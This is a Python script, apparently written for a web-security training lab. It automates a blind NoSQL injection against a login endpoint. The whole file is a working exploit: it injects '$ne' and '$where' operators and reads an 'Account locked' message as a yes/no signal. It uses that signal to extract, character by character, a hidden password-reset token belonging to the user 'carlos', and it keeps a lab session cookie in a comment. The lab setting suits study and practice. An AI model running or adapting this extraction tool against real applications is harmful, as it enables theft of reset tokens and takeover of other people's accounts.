import multiprocessing
import requests
import typer
import rich

def find_nth_char_proc(input_data):
    field_name, char_idx, to_check, headers, url, payload = input_data
    payload['$where'] = f"this.{field_name}.match(/^{'.' * char_idx}{to_check}.*$/)"
    resp = requests.post(url, headers=headers, json=payload)
    if 'Account locked' in resp.text:
        return to_check
    return None

def find_token_length_proc(input_data):
    field_name, to_check, headers, url, payload = input_data
    payload['$where'] = f"this.{field_name}.length == {to_check}"
    resp = requests.post(url, headers=headers, json=payload)
    if 'Account locked' in resp.text:
        return to_check
    return None

def collapse(data):
    for r in data:
        if r is not None:
            return r
    raise RuntimeError("Couldn't find valid return value...")

def main(base_url: str, session_cookie: str, field_name: str, pool_size: int = -1):
    if pool_size < 0:
        pool_size = multiprocessing.cpu_count()
    #pool_size = 12
    #base_url = 'https://0a9500ba041cb22184c53150005800e8.web-security-academy.net'
    #session_cookie = '42bLN0ruWjxrBVB2ZfwYXRaXJupwIdCB'
    #field_name = 'forgotPwd'
    console = rich.console.Console()
    url = base_url + '/login'

    http_headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept': '*/*',
        'Accept-Language': 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer': url,
        'Origin': base_url,
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Cookie': f'session={session_cookie}',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0'
    }

    base_payload = { "username": "carlos", "password": { "$ne": "" }, "$where": None }
    with console.status("Guessing token length..."):
        proc_input_data = [ (field_name, i, http_headers, url, base_payload) for i in range(1, 20) ]
        with multiprocessing.Pool(pool_size) as p:
            results = p.map(find_token_length_proc, proc_input_data)
        
        token_len = collapse(results)
    
    console.print(f'Found token length: {token_len}')

    possible_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789'
    token = ""

    console.print('Guessing token: ', end="")
    for i in range(token_len):
        proc_input_data = [ (field_name, i, c, http_headers, url, base_payload) for c in possible_chars ]
        with multiprocessing.Pool(pool_size) as p:
            results = p.map(find_nth_char_proc, proc_input_data)
        
        found_char = collapse(results)
        console.print(found_char, end="")
        token += found_char
        
    console.print(f'\nFound full token: [red]{token}[/red]')

if __name__ == '__main__':
    typer.run(main)